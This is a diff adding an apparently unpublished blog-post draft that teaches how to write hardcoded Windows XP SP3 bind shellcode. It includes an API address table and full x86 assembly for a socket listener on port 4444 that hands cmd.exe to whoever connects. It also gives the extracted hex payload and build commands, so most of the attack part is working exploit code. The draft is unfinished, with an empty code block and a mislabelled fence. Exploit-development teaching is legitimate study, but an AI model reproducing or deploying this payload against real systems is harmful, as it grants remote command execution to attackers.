@@ -1,0 +1,252 @@
+---
+layout: post
+title: Tutorial - Hardcoded Windows Shellcodes (32bit)
+published: false
+---
+
+## Intro
+
+In this article I will write a walkthrough on how to write shellcodes, both bind and reverse. I assume the reader already knows basic x86 Assembly and have an understanding about sockets before reading further.  
+
+You will notice that the shellcodes presented in this article are respectively 70 and 113 bytes long. You might be wondering why Windows shellcodes from msfvenom is about 300-400 bytes in comparison; This is because the payloads from msfvenom will work on any Windows version. It has extra code that will automatically find addresses for DLLs and system calls, which is different on every Windows release. The shellcodes in this article has hardcoded addresses, which will only work for one Windows version, which in this case will be Windows XP SP3 (eng). Why not just stick to shellcodes from msfvenom? Most often you will have enough space for your payload and you can use a shellcode from msfvenom, but in some cases you won't have enough space, thus unless you find a small hardcoded shellcode, you need to create your own. If you are interesting in learning how to write shellcodes that finds the necessary addresses automatically, you can read this amazing article: <a href="https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html">https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html</a>
+
+## Tools
+
+I will develop on the same Windows XP SP3 environment that the exploit is meant for, which means that we need to download some tools:
+
+<a href="https://www.fuzzysecurity.com/tutorials/expDev/tools/arwin.rar">Arwin.exe</a>
+<a href="http://mingw.org/category/wiki/download">id.exe and objdump.exe</a>
+<a href="https://www.nasm.us/pub/nasm/releasebuilds/">nasm.exe</a>
+
+## System calls and addresses
+
+First off, we need to figure out the DLLs containing the system calls we need. Since we are going to create sockets, we already know that we need to use system calls, such as bind() and listen(). A quick Google search on "bind socket microsoft" gives us the following documentation: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-bind">https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-bind</a>
+
+If we scroll down, we will see it mentions Ws2_32.dll. Now we can use arwin.exe to figure out the address of the bind system call. On the target machine, open cmd.exe and type:
+
+```
+> arwin.exe ws2_32.dll bind
+arwin - win32 address resolution program - by steve hanna - v.01
+bind is located at 0x71ab4480 in ws2_32.dll
+> arwin.exe ws2_32.dll listen
+arwin - win32 address resolution program - by steve hanna - v.01
+listen is located at 0x71ab8cd3 in ws2_32.dll
+```
+
+We also know that we need to load this DLL, at least at this stage, and a Google search reveals the LoadLibraryA() system call: <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya</a>, which is found in the kernel32.dll:
+
+```
+> arwin.exe kernel32.dll LoadLibraryA
+arwin - win32 address resolution program - by steve hanna - v.01
+LoadLibraryA is located at 0x7c801d7b in kernel32.dll
+```
+
+If we continue this process, we have compiled a table of relevant system calls and their addresses:
+
+```
+ws2_32.dll:       
+  closesocket()           71AB3E2B
+  accept()                71AC1040
+  listen()                71AB8CD3
+  bind()                  71AB4480
+  connect()               71AB4a07
+  WSASocketA()            71AB8B6A
+  WSAStartup()            71AB6a55
+  WSAGetLastError()       71AB3CCE
+
+ kernel32.dll:
+  LoadLibraryA()          7C801D7B
+  ExitProcess()           7C81CAFA
+  WaitForSingleObject()   7C802530
+  CreateProcessA()        7C80236B
+  SetStdHandle()          7C81D363
+
+ msvcrt.dll:       
+  system()                77C293C7
+```
+
+## Shellcoding
+
+I won't go in depths about shellcoding in general here, but when you write shellcode for an exploit, you need to take certain precautions. For instance, hardcoding null bytes (0x00) will terminate strings and will most certain break the code. Also, you can't store strings like you would normally. Instead you can tricks, such as jmp-call-pop or pushing strings on the stack or to registers. I would recommend the course SLAE32 from PentesterAcademy to get a deeper understanding of shellcoding.
+
+## Bindshell (port 4444)
+
+We want our first version of the shellcode to work as a standalone executable to better understand if it's working or not, before stripping away unnecessary parts. Also note that the size of the following shellcode can be reduced further, but I have purposely made it a little bigger for readability and flexibility. For example, pointers to strings are pushed on the stack instead of using the jmp-call-pop method to avoid jumps in the code.
+
+### LoadLibraryA(_In_ LPCTSTR lpFileName)
+
+Docs: https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
+
+This system call loads a DLL file into the memory. It takes one argument, which is the name of the file.
+In case you are not familiar with Windows system calls, the basic idea is to fill up the stack with arguments before calling the function at the given address, referenced in the table created earlier.
+
+
+```assembly
+xor eax, eax        ; Clear eax
+mov ax, 0x3233      ; Store string "32" in AX (explanation below)
+push eax            ; Push string "32\0" on stack
+push 0x5f327377     ; Push string "ws2_" on stack
+push esp            ; Push addr of "ws2_32\0" on stack, which will be the lpFileName argument
+mov eax, 0x7c801d7b ; Address to LoadLibraryA()
+call eax
+```
+
+A trick was used here to insert a null byte to terminate the "ws2_32" string, without actually writing a null byte.
+The `mov ax, 0x3233` operation stores the string "32" in the lowest 16 bits of EAX. The highest 16 bits are filled with 0x00 (due to the previous `xor eax, eax` operation). This will nicely terminate the string without us needing to hardcode a null bytes in the code. If we would have done the following instead, it would have broken the code:
+
+```assembly
+push 0x00003233 "32\0"
+push 0x5f327377 "ws2_"
+```
+
+This LoadLibraryA() system call is very straight forward. The stack looks like the following before `call eax`, where a pointer to the filename string is on the top of the stack, as the first and only argument:
+
+```
+   Addr        Value
+   00000001    00000002 -----------------
+-> 00000002    00003233 (ASCII 32\0)    |
+|  00000003    5f327377 (ASCII ws2_)    |
+|                                       |
+-----------------------------------------
+```
+
+### WSAStartup(WORD wVersionRequired, LPWSADATA lpWSAData)
+
+Docs: https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
+
+The next system call we need to run is WSAStartup() to initialize the use of sockets. It takes two arguments, where the first is the version we are going to use and the second is a pointer to a place to store socket data.
+
+```assembly
+add esp, 0xFFFFFE70 ; Creating space on stack (400 bytes)
+push esp            ; Arg lpWSAData = top of stack
+push 0x101          ; Arg wVersionRequired = 1.1
+mov eax, 0x71ab6a55 ; Address to WSAStartup()
+call eax
+```assembly
+
+
+
+
+The complete shellcode:
+
+```assembly
+; LoadLibraryA(_In_ LPCTSTR lpFileName)
+xor eax, eax
+mov ax, 0x3233
+push eax            ; Push 0x00003233 (ASCII 32\0)
+push 0x5f327377     ; Push 0x5f327377 (ASCII ws2_)
+mov ebx, esp        ; Store pointer to "ws2_32" in ebx
+push ebx            ; Arg lpFileName = ebx -> "ws2_32"
+mov eax, 0x7c801d7b
+call eax
+
+; WSAStartup(WORD wVersionRequired, LPWSADATA lpWSAData)
+add esp, 0xFFFFFE70 ; Creating space on stack (400 bytes)
+push esp            ; Arg lpWSAData = top of stack
+push 0x101          ; Arg wVersionRequired = 1.1
+mov eax, 0x71ab6a55
+call eax
+
+; WSASocketA(int af, int type, int protocol, 
+;            LPWSAPROTOCOL_INFOA lpProtocolInfo, 
+;            GROUP g, DWORD dwFlags)
+xor eax, eax
+push eax             ; Arg dwFlags = 0
+push eax             ; Arg g = 0
+push eax             ; Arg lpProtocolInfo = 0
+push eax             ; Arg protocol = IPPROTO_TCP
+push 0x1             ; Arg type = SOCK_STREAM
+push 0x2             ; Arg af = AF_INET
+mov eax, 0x71AB8B6A
+call eax
+mov ebx, eax         ; Store WSASocket() handler
+
+; bind(SOCKET s, const sockaddr *addr, int namelen)
+xor eax, eax
+push eax             ; Creating space on stack
+push eax             ; ...
+push eax             ; ...
+mov eax, 0x5c110102 
+dec ah               ; eax: 0x5c110102 -> 0x5c110002 (Mitigating null byte)
+push eax             ; Store the portnr on stack
+mov eax, esp         ; Store pointer to the portnr
+push 0x10            ; Arg namelen = 16 bytes
+push eax             ; Arg *addr = eax -> 0x5c110002 (5c11 = 4444, 0002 = INET_AF)
+push ebx             ; Arg s = WSASocket() handler
+mov eax, 0x71AB4480
+call eax
+
+; listen(SOCKET s, int backlog)
+push 0x1             ; Arg backlog = 1         
+push ebx             ; Arg s = WSASocket() handler
+mov eax, 0x71AB8CD3       
+call eax
+
+; accept(SOCKET s, sockaddr *addr, int *addrlen)      
+xor eax, eax
+push eax             ; Arg addrlen = 0
+push eax             ; Arg *addr = 0
+push ebx             ; Arg s = WSASocket() handler
+mov eax, 0x71AC1040
+call eax
+mov ebx, eax         ; Store accept() handler
+
+; SetStdHandle(_In_ DWORD nStdHandle, _In_ HANDLE hHandle)
+mov edx, 0x7c81d363
+
+push ebx             ; Arg hHandle = accept() handler
+push 0xfffffff6      ; Arg nStdHandle = -0A (STD_INPUT)
+call edx
+          
+push ebx             ; Arg hHandle = accept() handler
+push 0xfffffff5      ; Arg nStdHandle = -0B (STD_OUTPUT)
+call edx
+          
+push ebx             ; Arg hHandle = accept() handler          
+push 0xfffffff4      ; Arg nStdHandle = -0C (STD_ERROR)
+call edx
+
+; system(const char *command)
+mov DWORD [esp-0x5], 0x646d6341   ; Store string "Acmd" 5 bytes from top of stack
+lea eax, [esp-0x4]                ; Store pointer to the string "cmd\0" in eax
+lea esp, [esp-0x4]                ; Manually update esp
+push eax                          ; Arg *command = eax -> "cmd"
+mov eax, 0x77c293c7
+call eax
+```
+
+If we were going to use the shellcode as a payload for an exploit, then we can easily reduce the size by removing the code to load the socket library (LoadLibraryA()) and the socket startup call (WSAStartup()). This is because the target vulnerable software probably has already loaded the ws2_32.dll library and ran a socket startup call. This can be confirmed with the following command, which will display all loaded DLLs by the executable:
+
+```
+> tasklist.exe /m /fi "imagename eq vulnerable.exe"
+```
+
+
+# More optimized exploitation ready shellcode (130 bytes):
+This code can however not be placed directly inside a C skeleton without including ws2_32.dll and calling WSAStartup().
+
+```assembly
+
+```
+
+
+
+
+Another great guide on Windows shellcoding: http://www.hick.org/code/skape/papers/win32-shellcode.pdf
+
+
+; Compiling on Windows:
+;   > nasm.exe -f win32 -o shell.obj shell.asm
+;   > ld.exe shell.obj -o shell.exe
+; 
+; Get shellcode string in hex:
+;   $ for i in $(objdump -d shell.exe |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
+
+
+; Shellcode in hex string (without LoadLibrary and WSAStarup):
+;
+; \x31\xc0\x50\x50\x50\x50\x6a\x01\x6a\x02\xb8\x6a\x8b\xab\x71\xff\xd0\x89\xc3\x31\xc0\x50\x50\x50\xb8\x02
+; \x01\x11\x5c\xfe\xcc\x50\x89\xe0\x6a\x10\x50\x53\xb8\x80\x44\xab\x71\xff\xd0\x6a\x01\x53\xb8\xd3\x8c\xab
+; \x71\xff\xd0\x31\xc0\x50\x50\x53\xb8\x40\x10\xac\x71\xff\xd0\x89\xc3\xba\x63\xd3\x81\x7c\x53\x6a\xf6\xff
+; \xd2\x53\x6a\xf5\xff\xd2\x53\x6a\xf4\xff\xd2\xc7\x44\x24\xfb\x41\x63\x6d\x64\x8d\x44\x24\xfc\x8d\x64\x24
+; \xfc\x50\xb8\xc7\x93\xc2\x77\xff\xd0
